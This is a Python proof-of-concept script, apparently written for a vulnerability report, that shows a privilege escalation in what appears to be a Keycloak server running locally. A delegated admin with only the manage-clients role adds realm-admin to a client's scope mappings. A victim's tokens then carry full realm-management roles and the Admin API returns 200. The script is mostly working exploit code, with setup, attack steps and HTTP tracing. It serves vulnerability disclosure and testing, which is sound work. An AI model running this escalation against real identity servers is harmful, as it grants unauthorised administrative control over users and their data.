#!/usr/bin/env python3
"""K1 proof, reply-run edition (proof3.py): identical scenario and steps to
proof2.py (runs 2/3 of the original submission), plus a complete HTTP
request/response trace of every exchange, written to http-trace.txt in the
output directory. Original docstring follows.

K1 proof, run-2 edition: full chain incl. kc-admin-api client-scope assignment.
Delegated admin (ONLY manage-clients) -> (legit) attach built-in `kc-admin-api`
client scope to a restrictive client -> victim token gains admin audience but
STILL no admin roles (filter intact, Admin API 403) -> K1 attack adds
realm-admin to the client's scope mappings (unguarded canMapClientScope) ->
victim token now carries the full realm-management role set -> Admin API 200.
Plus: evaluator diagnostics + plain-realm-role discriminator probe.
Usage: proof2.py <realm-name> <outdir>
"""
import base64, json, os, sys, urllib.request, urllib.error, urllib.parse

BASE = "http://127.0.0.1:8080"
REALM = sys.argv[1]
OUT = sys.argv[2]
os.makedirs(OUT, exist_ok=True)
LOG = []

def log(msg):
    print(msg, flush=True)
    LOG.append(msg)

TRACE = []
TRACE_N = [0]

def _fmt_body(raw):
    if not raw:
        return "(empty)"
    try:
        return json.dumps(json.loads(raw), indent=1)
    except Exception:
        return raw

def req(method, url, token=None, body=None, form=None):
    data = None
    headers = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if form is not None:
        data = urllib.parse.urlencode(form).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    if token:
        headers["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    TRACE_N[0] += 1
    n = TRACE_N[0]
    entry = [f"===== HTTP exchange #{n} =====",
             f">>> {method} {url}",
             ">>> Request headers:"]
    for k, v in headers.items():
        entry.append(f">>>   {k}: {v}")
    entry.append(">>> Request body:")
    entry.append(">>>   " + (data.decode() if data else "(empty)"))
    try:
        with urllib.request.urlopen(r) as resp:
            raw = resp.read().decode()
            entry.append(f"<<< HTTP {resp.status}")
            entry.append("<<< Response headers:")
            for k, v in resp.headers.items():
                entry.append(f"<<<   {k}: {v}")
            entry.append("<<< Response body:")
            entry.append("<<<   " + _fmt_body(raw).replace("\n", "\n<<<   "))
            TRACE.append("\n".join(entry))
            return resp.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        entry.append(f"<<< HTTP {e.code}")
        entry.append("<<< Response headers:")
        for k, v in e.headers.items():
            entry.append(f"<<<   {k}: {v}")
        entry.append("<<< Response body:")
        entry.append("<<<   " + _fmt_body(raw).replace("\n", "\n<<<   "))
        TRACE.append("\n".join(entry))
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw

def token(realm, client, username, password, secret=None):
    form = {"client_id": client, "username": username, "password": password,
            "grant_type": "password"}
    if secret:
        form["client_secret"] = secret
    st, resp = req("POST", f"{BASE}/realms/{realm}/protocol/openid-connect/token", form=form)
    assert st == 200, f"token failed {st}: {resp}"
    return resp["access_token"]

def decode(tok):
    payload = tok.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))

def rm_roles(p):
    return sorted(p.get("resource_access", {}).get("realm-management", {}).get("roles", []))

def main():
    master = token("master", "admin-cli", "admin", "adminpass")
    st, _ = req("POST", f"{BASE}/admin/realms", token=master,
                body={"realm": REALM, "enabled": True})
    log(f"[setup] create realm {REALM}: HTTP {st}")
    A = f"{BASE}/admin/realms/{REALM}"

    st, rrep = req("GET", A, token=master)
    json.dump(rrep, open(f"{OUT}/realm-rep.json", "w"), indent=1)
    log(f"[diag] realm rep adminPermissionsEnabled field: {rrep.get('adminPermissionsEnabled')}; attributes: {rrep.get('attributes')}")

    st, clients = req("GET", f"{A}/clients?clientId=realm-management", token=master)
    RM = clients[0]["id"]
    def client_role(name):
        st, role = req("GET", f"{A}/clients/{RM}/roles/{name}", token=master)
        return role
    realm_admin = client_role("realm-admin")
    manage_clients = client_role("manage-clients")
    manage_realm = client_role("manage-realm")
    log(f"[setup] realm-management uuid={RM}")

    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "app-user"})
    st, app_user = req("GET", f"{A}/roles/app-user", token=master)
    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "plain-role"})
    st, plain_role = req("GET", f"{A}/roles/plain-role", token=master)
    st, _ = req("POST", f"{A}/roles", token=master, body={"name": "innocent-bundle"})
    st, bundle = req("GET", f"{A}/roles/innocent-bundle", token=master)
    st, _ = req("POST", f"{A}/roles/innocent-bundle/composites", token=master,
                body=[{"id": manage_realm["id"], "name": "manage-realm"}])
    log("[setup] realm roles app-user, plain-role, innocent-bundle(->manage-realm) created")

    def make_client(cid):
        st, _ = req("POST", f"{A}/clients", token=master, body={
            "clientId": cid, "enabled": True, "publicClient": False,
            "secret": "portal-secret", "directAccessGrantsEnabled": True,
            "standardFlowEnabled": True, "fullScopeAllowed": False})
        st, cl = req("GET", f"{A}/clients?clientId={cid}", token=master)
        uuid = cl[0]["id"]
        st2, _ = req("POST", f"{A}/clients/{uuid}/scope-mappings/realm", token=master,
                     body=[{"id": app_user["id"], "name": "app-user"}])
        log(f"[setup] client {cid} (fullScopeAllowed=false) + baseline mapping [app-user]: HTTP {st2}")
        return uuid

    portal = make_client("portal")
    portal2 = make_client("portal2")

    st, _ = req("POST", f"{A}/clients", token=master,
                body={"clientId": "deleg-app", "enabled": True})
    st, da = req("GET", f"{A}/clients?clientId=deleg-app", token=master)
    deleg_app = da[0]["id"]
    st, _ = req("POST", f"{A}/clients/{deleg_app}/roles", token=master,
                body={"name": "deleg-role"})
    log("[setup] client deleg-app with role deleg-role created")

    st, scopes = req("GET", f"{A}/client-scopes", token=master)
    kc_scope = [s for s in scopes if s["name"] == "kc-admin-api"][0]
    log(f"[setup] built-in client scope kc-admin-api id={kc_scope['id']}")

    def make_user(name, pw):
        st, _ = req("POST", f"{A}/users", token=master, body={
            "username": name, "enabled": True, "email": f"{name}@example.local",
            "emailVerified": True, "firstName": name, "lastName": "Test",
            "credentials": [{"type": "password", "value": pw, "temporary": False}]})
        st, users = req("GET", f"{A}/users?username={name}", token=master)
        return users[0]["id"]

    victim = make_user("victim", "victimpass")
    st, _ = req("POST", f"{A}/users/{victim}/role-mappings/clients/{RM}",
                token=master, body=[{"id": realm_admin["id"], "name": "realm-admin"}])
    log(f"[setup] victim granted realm-admin (by trusted admin): HTTP {st}")
    delegated = make_user("delegated", "delegpass")
    st, _ = req("POST", f"{A}/users/{delegated}/role-mappings/clients/{RM}",
                token=master, body=[{"id": manage_clients["id"], "name": "manage-clients"}])
    st, eff = req("GET", f"{A}/users/{delegated}/role-mappings/clients/{RM}", token=master)
    log(f"[setup] delegated granted ONLY manage-clients: HTTP {st}; effective: {[r['name'] for r in eff]}")

    dtok = token(REALM, "admin-cli", "delegated", "delegpass")
    st, _ = req("GET", f"{A}/clients", token=dtok)
    log(f"[diag] delegated GET /clients (manage-clients effective?): HTTP {st}")

    def victim_token(client):
        return token(REALM, client, "victim", "victimpass", secret="portal-secret")

    # ---- baseline ----
    vt = victim_token("portal")
    v0 = decode(vt)
    json.dump(v0, open(f"{OUT}/token-victim-baseline.json", "w"), indent=1)
    log(f"[baseline] victim@portal realm-management roles: {rm_roles(v0)}; aud={v0.get('aud')}; scope={v0.get('scope')}")
    st, _ = req("GET", f"{A}/users", token=vt)
    log(f"[baseline] victim@portal token -> GET /admin/realms/{REALM}/users: HTTP {st}")

    # ---- legitimate step: delegated attaches kc-admin-api scope to portal ----
    st, resp = req("PUT", f"{A}/clients/{portal}/default-client-scopes/{kc_scope['id']}", token=dtok)
    log(f"[legit] delegated assigns kc-admin-api client scope to portal: HTTP {st} {resp if st >= 400 else ''}")
    vt = victim_token("portal")
    vpre = decode(vt)
    json.dump(vpre, open(f"{OUT}/token-victim-pre-attack.json", "w"), indent=1)
    log(f"[pre-attack] victim@portal realm-management roles: {rm_roles(vpre)}; aud={vpre.get('aud')}; scope={vpre.get('scope')}")
    st, _ = req("GET", f"{A}/users", token=vt)
    log(f"[pre-attack] victim@portal token (admin audience, roles still filtered) -> GET users: HTTP {st} (expect 403)")

    # ---- CONTROL: guarded sibling (addComposites -> requireMapComposite) ----
    st, resp = req("POST", f"{A}/clients/{deleg_app}/roles/deleg-role/composites",
                   token=dtok, body=[{"id": realm_admin["id"], "name": "realm-admin"}])
    log(f"[control] delegated adds realm-admin as composite child of deleg-role: HTTP {st} (expect 403) resp={resp if st>=400 else ''}")

    # ---- discriminator probes on portal2 (realm-role scope mappings) ----
    st, resp = req("POST", f"{A}/clients/{portal2}/scope-mappings/realm",
                   token=dtok, body=[{"id": plain_role["id"], "name": "plain-role"}])
    log(f"[probe] delegated adds PLAIN realm role plain-role to portal2 scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    st, resp = req("POST", f"{A}/clients/{portal2}/scope-mappings/realm",
                   token=dtok, body=[{"id": bundle["id"], "name": "innocent-bundle"}])
    log(f"[attack2] delegated adds composite innocent-bundle (child=manage-realm) to portal2 scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    v2 = decode(victim_token("portal2"))
    json.dump(v2, open(f"{OUT}/token-victim-portal2.json", "w"), indent=1)
    log(f"[attack2] victim@portal2 realm-management roles now: {rm_roles(v2)}")

    # ---- ATTACK 1: realm-admin into portal's client-role scope mappings ----
    st, resp = req("POST", f"{A}/clients/{portal}/scope-mappings/clients/{RM}",
                   token=dtok, body=[{"name": "realm-admin"}])
    log(f"[attack1] delegated adds realm-admin to portal scope mappings: HTTP {st} resp={resp if st>=400 else ''}")
    vt = victim_token("portal")
    v1 = decode(vt)
    json.dump(v1, open(f"{OUT}/token-victim-after-attack1.json", "w"), indent=1)
    log(f"[attack1] victim@portal realm-management roles now: {rm_roles(v1)}")
    st, users = req("GET", f"{A}/users", token=vt)
    n = len(users) if isinstance(users, list) else users
    log(f"[impact] victim@portal post-attack token -> GET /admin/realms/{REALM}/users: HTTP {st} (entries: {n})")
    if isinstance(users, list):
        log(f"[impact] usernames visible: {[u.get('username') for u in users]}")
    st, _ = req("GET", A, token=vt)
    log(f"[impact] victim@portal post-attack token -> GET /admin/realms/{REALM}: HTTP {st}")

    with open(f"{OUT}/proof-log.txt", "w") as f:
        f.write("\n".join(LOG) + "\n")
    with open(f"{OUT}/http-trace.txt", "w") as f:
        f.write("\n\n".join(TRACE) + "\n")

if __name__ == "__main__":
    main()
